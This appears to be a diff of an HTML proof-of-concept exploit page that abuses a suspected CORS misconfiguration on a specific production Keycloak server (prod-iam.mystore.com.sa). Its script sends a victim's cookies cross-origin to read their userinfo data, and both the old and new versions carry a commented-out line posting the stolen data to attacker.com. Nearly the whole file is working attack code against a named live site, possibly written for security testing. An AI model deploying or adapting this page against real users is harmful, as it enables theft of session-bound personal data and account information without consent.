@@ -1,32 +1,57 @@
 <!DOCTYPE html>
-<html>
-<head><title>Keycloak CORS Exploit PoC</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Keycloak CORS Exploit PoC</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    pre { background: #f4f4f4; padding: 15px; border-radius: 5px; white-space: pre-wrap; }
+  </style>
+</head>
 <body>
-<h2>Keycloak Token/Userinfo Theft PoC</h2>
-<pre id="output">Testing...</pre>
+  <h2>Keycloak CORS Exploit PoC – Proof of Reflection + Credentialed Fetch</h2>
+  <p>Open this file in a browser while logged into mystore.com.sa (or any app using prod-iam.mystore.com.sa Keycloak).</p>
+  <p><strong>Expected result:</strong> If CORS is broken (wildcard reflection + credentials:true), you should see JSON userinfo data below.</p>
+  <pre id="output">Loading userinfo from Keycloak...</pre>
 
-<script>
-async function stealKeycloakData() {
-  const kc = 'https://prod-iam.mystore.com.sa';
-  
-  try {
-    // Steal realm configuration + userinfo (if logged in)
-    const userinfo = await fetch(`${kc}/realms/master/protocol/openid-connect/userinfo`, {
-      credentials: 'include',
-      headers: { 'Origin': 'https://evil.com' }
-    });
-    
-    const data = await userinfo.json();
-    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
-    
-    // In real attack: exfiltrate tokens
-    // fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
-  } catch(e) {
-    document.getElementById('output').textContent = 'Error: ' + e.message;
+  <script>
+  async function stealKeycloakData() {
+    const kcBase = 'https://prod-iam.mystore.com.sa';
+    const output = document.getElementById('output');
+
+    try {
+      // Attempt to fetch protected userinfo endpoint with credentials (cookies/tokens)
+      const response = await fetch(`${kcBase}/realms/master/protocol/openid-connect/userinfo`, {
+        method: 'GET',
+        credentials: 'include',           // ← sends cookies / auth headers cross-origin
+        mode: 'cors',
+        headers: {
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+      }
+
+      const data = await response.json();
+      output.textContent = JSON.stringify(data, null, 2);
+
+      // Optional: In real attack, exfiltrate here
+      // await fetch('https://attacker.com/collect', {
+      //   method: 'POST',
+      //   body: JSON.stringify(data),
+      //   credentials: 'include'
+      // });
+    } catch (error) {
+      output.textContent = `Error: ${error.message}\n\n` +
+                           `(If 401/403: endpoint requires login or CORS blocked this request)\n` +
+                           `(If data appears: CORS misconfig allows credentialed cross-origin read!)`;
+    }
   }
-}
 
-stealData();
-</script>
+  // Call the function
+  stealKeycloakData();
+  </script>
 </body>
 </html>
